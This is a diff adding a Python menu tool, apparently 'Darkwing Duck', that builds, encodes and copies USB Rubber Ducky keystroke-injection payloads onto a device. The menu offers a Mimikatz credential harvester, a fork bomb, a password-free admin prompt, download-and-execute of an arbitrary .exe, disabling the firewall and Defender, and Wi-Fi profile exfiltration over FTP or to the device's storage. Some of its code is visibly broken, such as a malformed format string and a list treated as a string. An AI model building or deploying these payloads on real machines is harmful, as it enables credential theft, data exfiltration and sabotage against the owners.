@@ -1,0 +1,508 @@
+#!/usr/bin/python3
+
+import os
+import sys
+import platform
+import subprocess
+from time import sleep
+
+W = '\033[0m'   # white (normal)
+R = '\033[31m'  # red
+G = '\033[32m'  # green
+O = '\033[33m'  # orange
+B = '\033[34m'  # blue
+P = '\033[35m'  # purple
+C = '\033[36m'  # cyan
+
+
+def help():
+    """
+    help()
+
+    :return:
+
+    Print out the Rubber Ducky help syntax
+
+    """
+    print("""
+Ducky Commands:
+   ALT [key name] (ex: ALT F4, ALT SPACE)
+   CTRL | CONTROL [key name] (ex: CTRL ESC)
+   CTRL-ALT [key name] (ex: CTRL-ALT DEL)
+   CTRL-SHIFT [key name] (ex: CTRL-SHIFT ESC)
+   DEFAULT_DELAY | DEFAULTDELAY [Time in millisecond * 10] (change the delay between each command)
+   DELAY [Time in millisecond * 10] (used to overide temporary the default delay)
+   GUI | WINDOWS [key name] (ex: GUI r, GUI l)
+   REM [anything] (used to comment your code, no obligation :) )
+   ALT-SHIFT (swap language)
+   SHIFT [key name] (ex: SHIFT DEL)
+   STRING [any character of your layout]
+   REPEAT [Number] (Repeat last instruction N times)
+   [key name] (anything in the keyboard.properties)
+""")
+
+    return True
+
+
+def print_msg(mtype, msg):
+    """
+    print_msg (mtype, msg)
+
+    :param mtype:
+    :param msg:
+    :return:
+
+    Print a specific type of msg or ask for input
+
+    """
+    if mtype == 'fail':
+        print("[{0}-{1]] {2}".format(R, W, msg))
+    elif mtype == 'success':
+        print("[{0}+{1}] {2}".format(G, W, msg))
+    elif mtype == 'alert':
+        print("[{0}!{1}] {2}".format(O, W, msg))
+    elif mtype == 'info':
+        print("[{0}*{1}] {2}".format(P, W, msg))
+    elif mtype == 'question':
+        res = input("[{0}?{1}] {2}".format(C, W, msg))
+        return res
+
+def script():
+    """
+    script()
+
+    :return:
+
+    Write a script and generate a custom payload
+
+    """
+    print("Type your code here (hit ENTER to go to a new line) and when your done type DONE in all caps on a new line.")
+    def scriptss():
+        scripts = input(">")
+        while scripts != 'DONE':
+            FILE = open("payloads/custom.txt", "a+")
+            FILE.write(scripts + "\n")
+            FILE.close()
+            scriptss()
+
+        if scripts == "DONE":
+            FILE = open("payloads/custom.txt", "a+")
+            for line in FILE.readlines():
+                cleaned_line = line.replace(scripts, "")
+            FILE.close()
+            print_msg('success', "Generated payload!")
+
+        if platform.system() == "Windows":
+            subprocess.run("bin/duckencoder.jar -i payloads/custom.txt -o injections/custom.bin", shell=True,
+                           check=True)
+            print_msg('success', "Successfully encoded!")
+        elif platform.system() == "Linux":
+            subprocess.run("java -jar bin/duckencoder.jar -i payloads/custom.txt -o injections/custom.bin", shell=True,
+                           check=True)
+            print_msg('success', "Successfully encoded!")
+            sleep(2)
+            deploy_payload('custom')
+            clean_up('custom')
+            sys.exit(1)
+    scriptss()
+
+def encode():
+    """
+    encodeO
+
+    :return:
+
+    Encode a specified payload .txt to .bin
+
+    """
+    print("Include .txt and .bin in file names")
+    encode = print_msg('question', "Text file to be encoded: ")
+    print("Remember, for the script to work, it has to be called inject.bin")
+    output = print_msg('question', "Output file: ")
+    try:
+        if platform.system() == "Windows":
+            subprocess.run("bin/duckencoder.jar -i " + encode + " -o " + output, shell=True, check=True)
+            print_msg('success', "Successfully encoded!")
+        elif platform.system() == "Linux":
+            subprocess.run("java -jar bin/duckencoder.jar -i " + encode + " -o " + output, shell=True, check=True)
+            print_msg('success', "Successfully encoded!")
+    except FileNotFoundError as err:
+        print_msg('fail', "ENCODE ERROR: {0}".format(err))
+    except subprocess.CalledProcessError as err:
+        print_msg('fail', "ENCODE ERROR: {0}".format(err))
+    sleep(2)
+
+def configure_payload(payload, formatter):
+    """
+    configure_payload(payload, formatter)
+
+    :param payload:
+    :param formatter:
+    :return:
+
+    Configure payload with the formatter
+
+    """
+    TMP_FILE = None
+
+    try:
+        if payload == "exfil":
+            FILE = open("payloads/exfil/{0}.txt".format(payload), "r")
+            TMP_FILE = FILE.read()
+            FILE.close()
+        else:
+            FILE = open("payloads/{0}.txt".format(payload), "r")
+            TMP_FILE = FILE.read()
+            FILE.close()
+
+        FILE = open("tmp/{0}.txt".format(payload), "a+")
+
+        if formatter:
+            FILE.write(TMP_FILE.format(*formatter))
+            FILE.close()
+        else:
+            FILE.write(TMP_FILE)
+            FILE.close()
+        print_msg('success', "Payload configuration success!")
+        return True
+    except FileNotFoundError as err:
+        print_msg('fail', "CONFIG ERROR: {0}".format(err))
+        print_msg('fail', "Payload configuration failed!")
+        return False
+    except subprocess.CalledProcessError as err:
+        print_msg('fail', "CONFIG ERROR: {0}".format(err))
+        print_msg('fail', "Payload configuration failed!")
+        return False
+
+def generate_payload(payload, formatter):
+    """
+    generate_payload(payload, formatter)
+
+    :param payload:
+    :param formatter:
+    :return:
+
+    Open the specified payload into a tmp variable, format it, encode, then deploy if required
+
+    """
+    success = False
+
+    configuration_status = configure_payload(payload, formatter)
+
+    # If payload .txt was configured properly, and payload is exfil (Twin Duck)
+    if configuration_status and payload == "exfil":
+        try:
+            if platform.system() == "Windows":
+                subprocess.run("bin/duckencoder.jar -i payloads/exfil/{0}.txt -o injections/{0}.bin".format(payload),
+                               shell=True, check=True)
+                print_msg('success', "Successfully encoded!")
+            elif platform.system() == "Linux":
+                subprocess.run("java -jar bin/duckencoder.jar -i payloads/exfil/{0}.txt -o injections/{0}.bin".format(
+                    payload), shell=True, check=True)
+                print_msg('success', "Successfully encoded!")
+
+            # Success is True if the above ran successfully
+            success = True
+        except FileNotFoundError as err:
+            print_msg('fail', "ERROR: {0}".format(err))
+            success = False
+        except subprocess.CalledProcessError as err:
+            print_msg('fail', "ERROR: {0}".format(err))
+            success = False
+    # If payload .txt was configured properly, and payload is NOT exfil
+    elif configuration_status:
+        try:
+            if platform.system() == "Windows":
+                subprocess.run("bin/duckencoder.jar -i payloads/{0}.txt -o injections/{0}.bin".format(payload),
+                               shell=True, check=True)
+                print_msg('success', "Successfully encoded!")
+            elif platform.system() == "Linux":
+                subprocess.run("java -jar bin/duckencoder.jar -i payloads/{0}.txt -o injections/{0}.bin".format(payload),
+                               shell=True, check=True)
+                print_msg('success', "Successfully encoded!")
+
+            success = True
+        except FileNotFoundError as err:
+            print_msg('fail', "GENERATION ERROR: {0}".format(err))
+            success = False
+        except subprocess.CalledProcessError as err:
+            print_msg('fail', "GENERATION ERROR: {0}".format(err))
+            success = False
+    # If payload .txt was NOT configured properly
+    elif not configuration_status:
+        # Success is False if the configuration failed
+        success = False
+    else:
+        # Success is False if the configuration failed
+        success = False
+
+
+    # If payload configuration was a success, should we deploy?
+    if success:
+        print_msg('success', "Generated payload!")
+
+        clean_up(payload)
+
+        deploy = print_msg('question', "Deploy the payload to the Rubber Ducky (y/n)? ")
+
+        if deploy == "n":
+            return True
+        elif deploy == "y":
+            deploy_payload(payload)
+            return True
+        else:
+            return False
+    else:
+        print("[-] Payload generation failed!")
+
+def locate_usb():
+    """
+    locate_usb()
+
+    :return:
+
+    Locate USB devices on a Windows machine
+
+    """
+    import win32file
+    drive_list = []
+    drivebits=win32file.GetLogicalDrives()
+    for d in range(1,26):
+        mask=1 << d
+        if drivebits & mask:
+            drname='%c:\\' % chr(ord('A')+d)
+            t=win32file.GetDriveType(drname)
+            if t == win32file.DRIVE_REMOVABLE:
+                drive_list.append(drname)
+    return drive_list
+
+def deploy_payload(payload):
+    """
+    deploy_payload(payload)
+
+    :param payload:
+    :return:
+
+    Deploy the compiled payload
+
+    """
+    try:
+        if payload == "exfil":
+            if platform.system() == "Windows":
+                usb_drive = print_msg('question', "Please provide your MicroSD's drive letter? ({0})".format(locate_usb().replace(
+                    ":", "").replace("\\", "")))
+                subprocess.run("move injections\\{0}.bin {1}:\\inject.bin".format(payload, usb_drive), shell=True,
+                               check=True)
+                subprocess.run("copy payloads\\exfil\\e.cmd {1}:\\e.cmd".format(payload, usb_drive), shell=True,
+                               check=True)
+                subprocess.run("copy payloads\\exfil\\d.cmd {1}:\\d.cmd".format(payload, usb_drive), shell=True,
+                               check=True)
+                subprocess.run("copy payloads\\exfil\\i.vbs {1}:\\i.vbs".format(payload, usb_drive), shell=True,
+                               check=True)
+                subprocess.run("mkdir {1}:\\slurp".format(payload, usb_drive), shell=True, check=True)
+            elif platform.system() == "Linux":
+                usb_drive = print_msg('question', "Please provide your MicroSD's location? (/media/user/label) ")
+                subprocess.run("mv injections/{0}.bin {1}/inject.bin".format(payload, usb_drive), shell=True,
+                               check=True)
+                subprocess.run("cp payloads/exfil/e.cmd {1}/e.cmd".format(payload, usb_drive), shell=True,
+                               check=True)
+                subprocess.run("cp payloads/exfil/d.cmd {1}/d.cmd".format(payload, usb_drive), shell=True,
+                               check=True)
+                subprocess.run("cp payloads/exfil/i.vbs {1}/i.vbs".format(payload, usb_drive), shell=True,
+                               check=True)
+                subprocess.run("mkdir {1}/slurp".format(payload, usb_drive), shell=True, check=True)
+        else:
+            if platform.system() == "Windows":
+                usb_drive = print_msg('question', "Please provide your MicroSD's drive letter? ({0})".format(locate_usb().replace(
+                    ":", "").replace("\\", "")))
+                subprocess.run("move injections\\{0}.bin {1}:\\inject.bin".format(payload, usb_drive), shell=True,
+                               check=True)
+            elif platform.system() == "Linux":
+                usb_drive = print_msg('question', "Please provide your MicroSD's location? (/media/user/label) ")
+                subprocess.run("mv injections/{0}.bin {1}/inject.bin".format(payload, usb_drive), shell=True,
+                               check=True)
+    except FileNotFoundError as err:
+        print("[-] DEPLOY ERROR: {0}".format(err))
+    except subprocess.CalledProcessError as err:
+        print("[-] DEPLOY ERROR: {0}".format(err))
+
+def clean_up(payload):
+    """
+    clean_up(payload)
+
+    :param payload:
+    :return:
+
+    Clean up temporary file
+
+    """
+    try:
+        if platform.system() == "Windows":
+            subprocess.run("del tmp\\{0}.txt".format(payload), shell=True, check=True)
+        elif platform.system() == "Linux":
+            subprocess.run("rm tmp/{0}.txt".format(payload), shell=True, check=True)
+        print_msg('success', "Clean up complete")
+    except FileNotFoundError as err:
+        print_msg('fail', "CLEAN UP ERROR: {0}".format(err))
+    except subprocess.CalledProcessError as err:
+        print_msg('fail', "CLEAN UP ERROR: {0}".format(err))
+
+def select_payload():
+    """
+    select_payload()
+
+    :return:
+
+    Allow user to select payload type
+
+    """
+    while True:
+        print("")
+        print("-------------------------------------------------")
+        print("[1]  Simple Hello World")
+        print("Opens notepad and types Hello World")
+        print("-------------------------------------------------")
+        print("[2]  Mimikatz Cred Harvester")
+        print("Find passwords with mimkatz")
+        print("-------------------------------------------------")
+        print("[3]  Fork Bomb (Win7) ")
+        print("Makes and then executes a fork bomb")
+        print("-------------------------------------------------")
+        print("[4]  Admin Command Prompt")
+        print("Opens an cmd in admin without the admin password")
+        print("-------------------------------------------------")
+        print("[5]  Download a file")
+        print("Download and then execute a given .exe")
+        print("-------------------------------------------------")
+        print("[6]  Download a file v2")
+        print("Disable Firewall & Defender, download and then execute a given .exe. (v2)")
+        print("-------------------------------------------------")
+        print("[7]  Exfiltrate Wi-Fi Profiles via FTP")
+        print("This is number 6 + Export and exfiltrate Wif-Fi Profiles via FTP")
+        print("-------------------------------------------------")
+        print("[8]  Exfiltrate Wi-Fi Profiles via Storage (Twin Duck)")
+        print("This is number 6 + Export and exfiltrate Wif-Fi Profiles via Twin Duck Storage")
+        print("-------------------------------------------------")
+        print("[99] Exit")
+        print("Break and go to the main menu")
+        print("-------------------------------------------------")
+
+        script = print_msg('question', "Which script: ")
+
+        if script == "1":
+            generate_payload('helloworld', None)
+        elif script == "2":
+            url = print_msg('question', "URL: ")
+            formatter = [url]
+            generate_payload('mimikatz', formatter)
+        elif script == "3":
+            generate_payload('fork', None)
+        elif script == "4":
+            generate_payload('admin', None)
+        elif script == "5":
+            url = print_msg('question', "URL: ")
+            exe = print_msg('question', "EXE NAME: ")
+            formatter = [url, exe]
+            generate_payload('download', formatter)
+        elif script == "6":
+            url = print_msg('question', "URL: ")
+            exe = print_msg('question', "EXE NAME: ")
+            formatter = [url, exe]
+            generate_payload('exec_fetched_payload', formatter)
+        elif script == "7":
+            ftphost = print_msg('question', "FTP HOST: ")
+            username = print_msg('question', "FTP USERNAME: ")
+            password = print_msg('question', "FTP PASSWORD: ")
+            url = print_msg('question', "URL: ")
+            exe = print_msg('question', "EXE NAME: ")
+            formatter = [ftphost, username, password, url, exe]
+            generate_payload('extract_wifi_profiles_exec_fetched_payload', formatter)
+        elif script == "8":
+            url = print_msg('question', "URL: ")
+            exe = print_msg('question', "EXE NAME: ")
+            formatter = [url, exe]
+            generate_payload('exfil', formatter)
+        elif script == "99":
+            break
+
+if __name__ == "__main__":
+    header1 = """
+    
+                                                      ____
+                                                     /    `.
+                                                    /-----.|          ____
+                                                ___/___.---`--.__.---'    `--.
+                                  _______.-----'           __.--'             )
+                              ,--'---.______________..----'(  __         __.-'
+                                        `---.___,-.|(a (a) /-'  )___.---'
+                                                `-.>------<__.-'
+            ______                       _____..--'      //
+    __.----'      `---._                `._.--._______.-'/))
+,--'---.__              -_                  _.-(`-.____.'// \\
+          `-._            `---.________.---'    >\      /<   \\
+              \_             `--.___            \ \-__-/ /    \\
+                \_                  `----._______\ \  / /__    \\
+                  \                      /  |,-------'-'\  `-.__\\
+                   \                    (   ||            \      )
+                    `\                   \  ||            /\    /
+                      \                   >-||  @)    @) /\    /
+                      \                  ((_||           \ \_.'|
+                       \                    ||            `-'  |
+                       \                    ||             /   |
+                        \                   ||            (   '|
+                        \                   ||  @)     @)  \   |
+                         \                  ||              \  )
+                          `\_               `|__         ____\ |
+                             \_               | ``----'''     \|
+                               \_              \    .--___    |)
+                                 `-.__          \   |     \   |
+                                      `----.___  \^/|      \/\|
+                                               `--\ \-._  / | |   (FL)
+                                                   \ \  `'  \ \\
+                                            __...--'  )     (  `-._
+                                           (_        /       `.    `-.__
+                                             `--.__.'          `.       )
+                                                                 `.__.-'
+    """
+    header2 = """
+                   {0} _____              __              __                _____              __    
+                   |     \.---.-.----.|  |--.--.--.--.|__|.-----.-----. |     \.--.--.----.|  |--.
+                   |  --  |  _  |   _||    <|  |  |  ||  ||     |  _  | |  --  |  |  |  __||    < 
+                   |_____/|___._|__|  |__|__|________||__||__|__|___  | |_____/|_____|____||__|__|
+                                                                |_____| {1}                                  
+                          
+                    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ {2}▄▀▄▀▄ ▄▀▀▄ █▀▀▄ █  █{3} ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
+                    █▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ {4}█ ▀ █ ▀▄█▄ █  █ ▀▄▄▀{5} ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█ 
+                    ▓                                                                            ▓ 
+                    ▒                            (1) Select payload                              ▒ 
+                    ░                            (2) Make script                                 ░ 
+                    ·                            (3) Encode payload                              · 
+                    ·                            (4) Help                                        · 
+                    ░                            (5) Exit                                        ░ 
+                    ▒                                                                            ▒ 
+                    ▓          Developed By: @h4cklife - Thanks @hak5darren & @_t0x1c!           ▓ 
+                    █▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█ 
+                                                                                
+    """.format(P, W, C, W, C, W)
+    ########################### Main ###########################
+
+    print(header1)
+    while True:
+        print(header1)
+        print(header2)
+        main = print_msg('question', "Select Option: ")
+        if main == "1":
+            select_payload()
+        elif main == "2":
+            script()
+        elif main == "3":
+            encode()
+        elif main == "4":
+            help()
+        elif main == "99":
+            print("{0}\n[!] Exiting!\n{1}".format(P, W))
+            sys.exit()
+        else:
+            print("Did not get that!")
+            continue
+
